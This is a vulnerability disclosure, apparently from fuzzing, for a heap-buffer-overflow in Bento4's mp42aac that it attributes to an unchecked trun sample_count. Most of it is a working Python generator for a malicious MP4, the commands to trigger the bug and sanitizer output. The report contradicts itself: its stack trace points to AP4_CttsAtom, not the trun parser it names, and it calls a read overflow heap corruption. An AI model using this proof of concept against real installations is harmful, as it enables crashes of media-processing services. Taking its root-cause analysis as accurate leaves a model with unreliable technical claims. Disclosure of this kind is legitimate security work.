## Bug0: AP4_TrunAtom unbounded sample_count causes heap-buffer-overflow

In `AP4_TrunAtom::AP4_TrunAtom()` in `Ap4TrunAtom.cpp`, the file-controlled `sample_count` field is read from the stream and passed directly to `m_Entries.SetItemCount()` with no upper-bound check against the actual remaining box size, and processing the resulting malformed fragmented MP4 triggers a heap-buffer-overflow detected by AddressSanitizer.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct, os

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# trun: version=0, flags=0x201 (data_offset + sample_size per entry)
sample_count = 0x10000001
trun_data = struct.pack('>I', sample_count)  # sample_count
trun_data += struct.pack('>i', 8)            # data_offset (flags & 0x001)
# 1 fake entry: sample_size=1
trun_data += struct.pack('>I', 1)
trun = full_box(b'trun', 0, 0x201, trun_data)

# tfhd: track_id=1, flags=0
tfhd = full_box(b'tfhd', 0, 0, struct.pack('>I', 1))

# traf
traf = box(b'traf', tfhd + trun)

# mfhd (Movie Fragment Header)
mfhd = full_box(b'mfhd', 0, 0, struct.pack('>I', 1))  # sequence_number=1

# moof
moof = box(b'moof', mfhd + traf)

# mdat (empty)
mdat = box(b'mdat', b'')

# moov: mvhd + trak (minimal) + mvex
mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 2)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)

# tkhd for trak 1
tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>I', 0) + b'\x00'*4 + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)

# minimal stbl
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stsc = full_box(b'stsc', 0, 0, struct.pack('>I', 0))
stsz = full_box(b'stsz', 0, 0, struct.pack('>II', 0, 0))
stco = full_box(b'stco', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)
trak = box(b'trak', tkhd + mdia)

# mvex with trex
trex_data = struct.pack('>IIIII', 1, 1, 0, 0, 0)
trex = full_box(b'trex', 0, 0, trex_data)
mvex = box(b'mvex', trex)

moov = box(b'moov', mvhd + trak + mvex)

ftyp = box(b'ftyp', b'iso5' + struct.pack('>I', 0) + b'iso5' + b'isom' + b'mp42')

outpath = "poc_input.mp4"
with open(outpath, 'wb') as f:
    f.write(ftyp + moov + moof + mdat)
print(f"Written {outpath}, size={os.path.getsize(outpath)}")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ==723252==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f8 at pc 0x564a2bba8140 bp 0x7ffcece10870 sp 0x7ffcece10860
READ of size 1 at 0x5020000000f8 thread T0
    #0 0x564a2bba813f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x564a2bba9087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file with an oversized `sample_count` field in a `trun` box can trigger a heap-buffer-overflow during atom parsing, corrupting heap metadata and adjacent allocations in the mp42aac process. This condition is reachable from any invocation of mp42aac on an untrusted MP4 file with no authentication or special privilege required. The out-of-bounds read can lead to denial of service through process termination and, under exploitable heap layouts, may enable information disclosure or arbitrary code execution.
